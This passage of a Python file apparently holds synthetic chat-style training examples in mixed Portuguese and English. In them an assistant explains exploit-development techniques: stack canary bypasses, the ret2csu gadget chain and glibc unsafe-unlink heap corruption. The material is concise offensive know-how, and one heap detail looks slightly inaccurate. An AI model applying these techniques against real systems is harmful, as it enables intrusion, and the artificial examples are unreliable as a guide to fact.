         "Win10+ mitigations: HVCI, KDP, VBS — requer bypass dedicado."),],

    [msg("user", "explain stack canary bypass"),
     msg("assistant", "Canary é word random escrita antes do saved RBP, checada no epilogue. Bypass:\n"
         "1. **Leak** via format string: `%{N}$p` onde N = offset do canary (tipicamente argumento 7-11)\n"
         "2. **Brute force** byte-a-byte em servidor fork-based (canário é mesmo em todos forks)\n"
         "3. **SEH overflow** (Windows) ou **longjmp** — skipa epilogue check inteiro\n"
         "4. **TLS leak** — canary vive em `%fs:0x28`, leak via `__libc_stack_end` ou TLS primitive"),],

    [msg("user", "ret2csu LEA+SystemV x64"),
     msg("assistant", "__libc_csu_init contém gadget universal que seta rdi/rsi/rdx:\n"
         "```\n"
         "csu_gadget1: pop rbx, pop rbp, pop r12, pop r13, pop r14, pop r15, ret\n"
         "csu_gadget2: mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]\n"
         "```\n"
         "Setup: rbx=0, rbp=1, r12=&func_ptr_to_call, r13=rdx, r14=rsi, r15=rdi. Depois gadget2 chama com 3 args controlados. Essencial quando ROP pobre em pop rdx gadgets."),],

    [msg("user", "how2heap unsafe unlink explicação curta"),
     msg("assistant", "**Pré-tcache glibc**. Chunk livre na lista doubly-linked. Overflow corrupta `fd`/`bk` do chunk vizinho.\n"
         "```\n"
         "P->fd = &P - 0x18\n"
         "P->bk = &P - 0x10\n"
         "```\n"
         "Quando malloc unlinka P: `P->fd->bk = P->bk` → `*(&P) = &P - 0x10` → overwrite do ponteiro `&P` em algum GOT/.data pra target. Hoje mitigated em glibc 2.3.4+ via unlink checks."),],
]


ALL_V10 = {
    "tool_accuracy_reinforce": TOOL_ACC,
    "output_interpretation_reinforce": OUTPUT_INTERP,
    "exploit_dev_reinforce": EXPLOIT_DEV,
}


def counts():
    return {k: len(v) for k, v in ALL_V10.items()}
